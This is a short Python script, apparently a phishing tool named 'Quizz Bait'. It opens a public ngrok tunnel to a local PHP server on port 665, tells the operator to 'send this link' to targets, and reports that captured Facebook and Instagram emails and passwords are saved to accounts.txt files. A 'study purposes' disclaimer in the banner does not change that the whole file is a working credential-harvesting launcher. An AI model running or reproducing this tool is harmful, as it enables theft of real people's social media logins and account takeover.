# -*- coding: utf-8 -*-

#imports
from pyngrok import ngrok 
import subprocess 

#VAR
term  = "/usr/bin/xterm"
ngrokProc = ngrok.get_ngrok_process()
auth_login = input("\033[1;31m[+]Enter your authtoken(ngrok):\033[0m ")
authtoken = "{}".format(auth_login)

print("""


	.▄▄▄  ▄• ▄▌▪  ·▄▄▄▄•·▄▄▄▄•    ▄▄▄▄·  ▄▄▄· ▪  ▄▄▄▄▄
	▐▀•▀█ █▪██▌██ ▪▀·.█▌▪▀·.█▌    ▐█ ▀█▪▐█ ▀█ ██ •██  
	█▌·.█▌█▌▐█▌▐█·▄█▀▀▀•▄█▀▀▀•    ▐█▀▀█▄▄█▀▀█ ▐█· ▐█.▪
	▐█▪▄█·▐█▄█▌▐█▌█▌▪▄█▀█▌▪▄█▀    ██▄▪▐█▐█ ▪▐▌▐█▌ ▐█▌·
	·▀▀█.  ▀▀▀ ▀▀▀·▀▀▀ •·▀▀▀ •    ·▀▀▀▀  ▀  ▀ ▀▀▀ ▀▀▀

		\033[1;31m CODE BY: init6root\033[0m

		\033[1;31m Use this tool for study purposes, 
		I am not responsible for absolutely 
		anything you do wrong using this tool
		\033[0m
		
	""")


ngrok.set_auth_token(authtoken)
ngrok_tunnel = ngrok.connect(665)
print("\033[1;31msend this link: \033[0m" + ngrok_tunnel.public_url)
print("\033[1;31mPasswords and emails are saved on facebook/accounts.txt\033[0m")
print("\033[1;31mPasswords and emails are saved on instagram/accounts.txt\033[0m")
subprocess.call([term, "-e", "sudo php -S 0.0.0.0:665 -t ."])

try:
	ngrokProc.proc.wait()

except KeyboardInterrupt:
	print("\npart of the journey is the end")

ngrok.kill()






